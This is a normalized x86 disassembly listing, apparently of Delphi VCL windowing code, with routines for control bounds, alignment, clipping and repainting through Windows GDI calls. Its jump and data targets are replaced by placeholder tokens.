mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_43f204
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_440d98
mov eax ebx
mov si 0xffd0
call sub_403368
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_403368
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_43f204
push ebx
push esi
add esp 0xfffffff0
mov esi eax
cmp [ esi + 0x62 ] 0x0
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov bl [ esi + 0x61 ]
mov al [ r-xdata ]
cmp al bl
jne r-xdata
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x90 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
adc eax 0x0
mov eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
adc eax 0x0
mov eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
mov [ esi + 0x8c ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x2
je r-xdata
mov ebx [ esi + 0x30 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_446754
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x48 ]
mov [ esi + 0x90 ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x4c ]
mov [ esi + 0x94 ] eax
mov edx esp
mov eax [ esi + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ ebx + 0x1fa ]
mov [ esi + 0x90 ] eax
mov eax [ ebx + 0x1fe ]
mov [ esi + 0x94 ] eax
jmp r-xdata
sub_43f320
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x1
pop esi
pop ebx
retn
sub_43f344
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edx
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x2
pop esi
pop ebx
retn
sub_43f36c
push ebx
push esi
mov esi eax
push edx
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x4
pop esi
pop ebx
retn
sub_43f390
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
push edx
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x8
pop esi
pop ebx
retn
sub_43f3b4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xa0 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_43f4af
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_403368
test ebx ebx
je r-xdata
cmp [ eax + 0x178 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f4b6
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov edi eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov eax [ eax + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_418030
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
cmp [ ebx + 0x178 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffbf
call sub_403368
test edi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_403368
jmp r-xdata
mov eax [ ebx + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_417d38
sub_43f4c0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_43fff8
mov edx edi
mov eax ebx
call sub_43f570
mov edx edi
mov eax ebx
call sub_440e3c
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_43f52c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x154 ]
mov edx esi
call sub_403f94
pop esi
pop ebx
retn
mov [ ebx + 0x150 ] 0x0
sub_43f570
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ edx + 0x8 ]
mov edi [ edx ]
sub eax edi
push eax
mov eax [ edx + 0xc ]
mov ebp [ edx + 0x4 ]
sub eax ebp
push eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_43f5cc
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_43f5f8
mov edx eax
mov ecx esp
mov eax esi
call sub_416a38
mov edx esp
mov eax ebx
call sub_43fa3c
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43f610
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_43f5b4
mov ecx esp
mov edx esi
call sub_416a38
mov edx esp
mov eax ebx
call sub_43fa3c
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43f638
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43f6b9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f6c0
lea eax [ ebp - 0xc ]
call sub_403f40
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba08
call sub_4038f8
sub_43f6c8
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43f6f4
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43f720
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_45b740
sub_43f750
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0xa0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_440d98
sub_43f7cc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
mov al [ r-xdata ]
mov [ esi + 0x98 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
mov bl [ r-xdata ]
mov bl [ esi + 0x98 ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call sub_4063e4
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call sub_4063e4
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x90 ]
push eax
call sub_4063e4
mov [ esi + 0x90 ] eax
test bl 0x8
setne dl
test al al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call sub_4063e4
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call sub_4063e4
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x94 ]
push eax
call sub_4063e4
mov [ esi + 0x94 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call sub_4063e4
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call sub_4063e4
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
setne al
test al al
je r-xdata
test bl 0x10
je r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_421c90
push eax
call sub_4063e4
mov edx eax
mov eax ebx
call sub_421cac
sub_43f998
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_43fa2e
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_41ec30
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_43fbb0
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_40434c
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43fa35
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_43fbe0
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_43fa3c
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_43fa84
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba88
call sub_4038f8
test esi esi
je r-xdata
mov edx ebx
call sub_443044
mov edx ebx
mov eax esi
call sub_442f70
mov eax ebx
call sub_43f204
sub_43fad0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_403368
mov [ edi + 0x57 ] bl
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb00b
mov eax edi
call sub_440d98
mov eax edi
mov si 0xffd0
call sub_403368
sub_43fb68
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x7c ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_453c80
mov edx ebx
mov eax esi
call sub_41e7a8
sub_43fb8c
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_440d98
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_440d98
pop ebx
retn
sub_43fbb0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_43fb24
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_404030
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_43fb34
sub_43fbe0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43fc35
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43fbb0
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_40434c
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43fc3c
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
mov eax esi
call sub_404400
mov edx eax
mov eax ebx
call sub_43fb8c
sub_43fc60
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_421bec
cmp eax [ ebx + 0x84 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_440d98
pop ebx
retn
or [ ebx + 0x98 ] 0x10
mov eax [ ebx + 0x68 ]
call sub_421bec
mov [ ebx + 0x84 ] eax
sub_43fde8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_43fdd8
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_43cd80
mov eax esi
call sub_43cd80
jmp r-xdata
sub_43fe20
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x198 ]
mov edx ebx
call sub_417ef0
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x198 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_417d84
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x198 ]
mov ecx ebx
mov edx esi
call sub_417f10
mov cl 0x1
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_43fff8
mov eax ebx
call sub_457598
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd1
call sub_403368
sub_43fea0
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_43fe20
mov edx [ ecx + 0x198 ]
mov edx [ edx + 0x8 ]
dec edx
call sub_43fe20
jmp r-xdata
sub_43fec4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_43ff5a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ff61
lea eax [ ebp - 0xc ]
call sub_403f40
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba08
call sub_4038f8
sub_43ff6c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x198 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_417ef0
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_417e94
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_43f550
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43fff8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_446754
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43f550
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_446450
push eax
call InvalidateRect
push ebp
call sub_43ff6c
pop ecx
test al al
je r-xdata
mov al 0x1
sub_440094
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_457570
mov esi eax
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx 0xb043
mov eax ebx
call sub_440d98
mov [ edi + 0xc ] eax
cmp ebx esi
je r-xdata
mov edx edi
mov eax esi
mov si 0xffc9
call sub_403368
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4400f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_446754
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_446450
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_4401d1
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_4441d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_446450
push eax
call ReleaseDC
retn
sub_440258
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov eax edi
call sub_440dcc
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x9b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba88
call sub_4038f8
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_43f6f4
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406cec
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_440d98
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_43df00
sub_44031c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_440354
test al al
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
call sub_43e138
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov [ rw-data ] 0xffffffff
sub_440360
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_44039c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_4403e8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_440414
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_43fb54
mov edi eax
mov eax [ ebx + 0x38 ]
call sub_43fb40
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x20 ]
fild [ ebx + 0xc ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x44 ]
fld [ esp ]
call sub_40293c
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_40293c
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x44 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_446450
push eax
call GetWindowRect
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov dl [ ebx + 0x54 ]
push edx
lea edx [ ebx + 0x44 ]
push edx
mov eax [ eax + 0x17c ]
mov ecx [ ebx + 0x58 ]
mov edx [ ebx + 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_4404f8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
